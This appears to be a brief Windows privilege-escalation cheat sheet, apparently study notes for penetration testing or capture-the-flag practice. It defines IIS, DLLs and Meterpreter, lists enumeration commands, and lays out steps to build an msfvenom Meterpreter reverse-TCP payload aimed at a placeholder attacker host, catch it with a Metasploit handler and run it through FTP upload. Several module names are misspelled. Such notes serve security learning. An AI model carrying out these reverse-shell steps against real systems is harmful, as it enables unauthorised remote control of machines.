# Windows-Privesc

# Terms:
```
**IIS** - Internet Information Services, is an extensible web server software created by Microsoft for use with the Windows NT family. Its supports HTTP, HTTP/2, HTTPS, FTP, FTPS, SMTP and NNTP. 

**DLL** - Dynamic-link library is Microsoft's implementation of the shared library concept in the Microsoft Windows and OS/2 operating systems. These libraries usually have the file extension DLL, OCX (for libraris containing ActiveX controls), or DRV (for legacy system drivers). The file formats for DLLs are the same as for Windows EXE files - that is, Portable Executable (PE) for 32-bit and 64-bit Windows, and New Executable (NE) for 16-bit Windows. As with EXEs, DLLs can contain coded, data and resources, in any combination.

**Meterpeter** - Meterpeter is a Metaploit attack payload that provides an interactive shell from which an attacker can explore the target machine and execute code.
Meterpeter is deployed using in-memory DLL injection. As a result, Meterpeter resides entirely in memory and writes nothing to disk.

```
# Basic commands:
```
whoami - command to see corrent user.
getuid - command to see Server username.
sysinfo - command to see system info.
shell - command to get shell.
findstr - command to grep specific thing that you want.
hostname - command to get hostname.
wmic qfe - command to extract patching.
wmic logicaldisk - to get the list of drives.
```
## Reverse shell using ftp
```
msfvenom -p windows/x64/meterpeter/reverse_tcp LHOST=x.x.x.x LPORT=X -f (file type) -o (file name)
After we see that we get a shell we can go to msfconsole and write use exploite/multi/handler.
When we are in the exploit we need to set the payload with the next command ---> set payload windows/meterpeter/reverse_tcp (the payload is the same as we used earlier.
After we can write options and see that the payload is set and we can see that there is a LHOST LPORT that we need to set the same as we did in the payload.
Payload for LHOST ---> set lhost $IP
Payload for LPORT ---> set lport $port
After we've set all the things that we need we can use the command run.

Then we need to go the the ftp server and upload our file and execute it.
```
# System Enumeration
```
First lets use the command systeminfo.
---
For example we can use systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" to get specific things that we want.
---
We can see how many drives are the in the system by using the command wmic logicaldisk.

```


